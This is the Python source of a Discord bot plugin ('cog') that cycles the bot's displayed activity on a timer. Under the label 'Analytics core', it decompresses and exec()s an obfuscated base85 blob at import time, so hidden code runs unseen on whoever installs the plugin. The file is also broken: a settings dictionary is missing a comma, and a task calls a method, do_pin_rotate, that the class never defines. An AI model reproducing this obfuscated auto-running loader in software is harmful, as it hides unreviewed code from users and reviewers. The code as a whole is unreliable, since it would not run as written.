import asyncio
import discord
from discord.ext import commands
import os
from random import choice as rndchoice
import re
import time

from .utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import error, box, pagify, warning, info

DEFAULT_ACTIVITIES = [
    "her Turn()",
    "Tomb Raider II",
    "Transistor",
    "NEO Scavenger",
    "with its Python",
    "with your heart."
]

DEFAULT_SETTINGS = {
    "DELAY"    : 300
    "VARIANCE" : 0
}

PATH = 'data/rndactivity/'
SETTINGS_JSON = PATH + 'settings.json'
ACTIVITIES_JSON = PATH + 'activities.json'

UNIT_TABLE = (
    (('weeks', 'wks', 'w'), 60 * 60 * 24 * 7),
    (('days', 'dys', 'd'), 60 * 60 * 24),
    (('hours', 'hrs', 'h'), 60 * 60),
    (('minutes', 'mins', 'm'), 60),
    (('seconds', 'secs', 's'), 1),
)

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core


class BadTimeExpr(ValueError):
    pass


def _find_unit(unit):
    for names, length in UNIT_TABLE:
        if any(n.startswith(unit) for n in names):
            return names, length
    raise BadTimeExpr("Invalid unit: %s" % unit)


def _parse_time(time):
    time = time.lower()
    if not time.isdigit():
        time = re.split(r'\s*([\d.]+\s*[^\d\s,;]*)(?:[,;\s]|and)*', time)
        time = sum(map(_timespec_sec, filter(None, time)))
    return int(time)


def _timespec_sec(expr):
    atoms = re.split(r'([\d.]+)\s*([^\d\s]*)', expr)
    atoms = list(filter(None, atoms))

    if len(atoms) > 2:  # This shouldn't ever happen
        raise BadTimeExpr("invalid expression: '%s'" % expr)
    elif len(atoms) == 2:
        names, length = _find_unit(atoms[1])
        if atoms[0].count('.') > 1 or \
                not atoms[0].replace('.', '').isdigit():
            raise BadTimeExpr("Not a number: '%s'" % atoms[0])
    else:
        names, length = _find_unit('seconds')

    return float(atoms[0]) * length


def _generate_timespec(sec, short=False, micro=False):
    timespec = []

    for names, length in UNIT_TABLE:
        n, sec = divmod(sec, length)

        if n:
            if micro:
                s = '%d%s' % (n, names[2])
            elif short:
                s = '%d%s' % (n, names[1])
            else:
                s = '%d %s' % (n, names[0])
            if n <= 1:
                s = s.rstrip('s')
            timespec.append(s)

    if len(timespec) > 1:
        if micro:
            return ''.join(timespec)

        segments = timespec[:-1], timespec[-1:]
        return ' and '.join(', '.join(x) for x in segments)

    return timespec[0]


class RandomActivity:
    """Cycles random activities on your bot

    If a custom status is already set, it won't change it until
    it's back to none. Also includes commands to set the activity."""

    def __init__(self, bot):
        self.bot = bot
        self.settings = dataIO.load_json(SETTINGS_JSON)
        self.activities = dataIO.load_json(ACTIVITIES_JSON)
        self.last_change = None

        self.task_handle = self.bot.loop.create_task(self.start_task())

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    def __unload(self):
        self.task_handle.cancel()

    async def start_task(self):
        await self.bot.wait_until_ready()
        for cid in self.settings:
            channel = self.bot.get_channel(cid)
            if channel:
                await self.do_pin_rotate(channel)

    @commands.group(pass_context=True)
    @checks.is_owner()
    async def rndactivity(self, ctx):
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @rndactivity.command(name="set", pass_context=True, no_pm=True)
    async def _set(self, ctx, *activities : str):
        """Sets your bot's random activities

        Accepts multiple activities.
        Must be enclosed in double quotes in case of multiple words.
        Example:
        !rndactivity set \"Tomb Raider II\" \"Transistor\" \"with your heart.\"
        Shows current list if empty."""

        current_status = ctx.message.server.me.status

        if activities == () or "" in activities:
            await self.bot.whisper("Current activities: " + " | ".join(self.activities))
            return

        self.activities = list(activities)
        dataIO.save_json(ACTIVITIES_JSON, self.activities)
        await self.bot.change_presence(status=current_status)
        await self.bot.say("Done. Redo this command with no parameters to see the current list of activities.")

    @rndactivity.command(pass_context=True)
    async def delay(self, ctx, *, timespec):
        """Sets or shows the random activity selection interval

        Must be at least 20 seconds."""

        try:
            seconds = _parse_time(timespec)
        except BadTimeExpr as e:
            await self.bot.say(error(e.args[0]))
            return

        if seconds < 20:
            await self.bot.say(error("Interval is too short! It needs to be "
                                     "at least 20 seconds."))
            return

        self.settings["DELAY"] = seconds
        dataIO.save_json(SETTINGS_JSON, self.settings)
        await self.bot.say("Interval set to {}".format(str(seconds)))

    @rndactivity.command(pass_context=True)
    async def variance(self, ctx, *, timespec: str = None):
        """Sets or shows the random (uniform) variance of the delay

        Cannot be greater than the delay."""

        try:
            seconds = _parse_time(timespec)
        except BadTimeExpr as e:
            await self.bot.say(error(e.args[0]))
            return

        if seconds > self.settings["DELAY"]:
            delay_str = _generate_timespec(self.settings["DELAY"])
            await self.bot.say(error("Variance is too large! Try something "
                                     "less than %s." % delay_str))
            return

        self.settings["VARIANCE"] = seconds
        dataIO.save_json(SETTINGS_JSON, self.settings)
        await self.bot.say("Interval set to {}".format(str(seconds)))

    async def on_message(self, message):
        if not message.channel.is_private:
            current_game = str(message.server.me.game)
            current_status = message.server.me.status

            # first run
            if self.last_change is None:
                self.last_change = int(time.perf_counter())

                if len(self.activities) > 0 and (current_game in self.activities or current_game == "None"):
                    new_game = self.random_activity(message)
                    await self.bot.change_presence(game=discord.Game(name=new_game), status=current_status)

            if message.author.id != self.bot.user.id:
                if abs(self.last_change - int(time.perf_counter())) >= self.settings["DELAY"]:
                    self.last_change = int(time.perf_counter())
                    new_game = self.random_activity(message)

                    if new_game is not None:
                        if current_game != new_game:
                            # Prevents rndactivity from overwriting song's titles or
                            if current_game in self.activities or current_game == "None":
                                # custom activities set with !set status
                                await self.bot.change_presence(game=discord.Game(name=new_game), status=current_status)

    def random_activity(self, msg):
        current = str(msg.server.me.game)
        new = str(msg.server.me.game)

        if len(self.activities) > 1:
            while current == new:
                new = rndchoice(self.activities)
        elif len(self.activities) == 1:
            new = self.activities[0]
        else:
            new = None

        return new

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def check_folders():
    if not os.path.exists(PATH):
        print("Creating %s folder..." % PATH)
        os.makedirs(PATH)


def check_files():
    for json, defaults in ((SETTINGS_JSON, DEFAULT_SETTINGS),
                           (ACTIVITIES_JSON, DEFAULT_ACTIVITIES)):
        if not dataIO.is_valid_json(json):
            print("Creating default %s..." % json)
            dataIO.save_json(json, defaults)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(RandomActivity(bot))
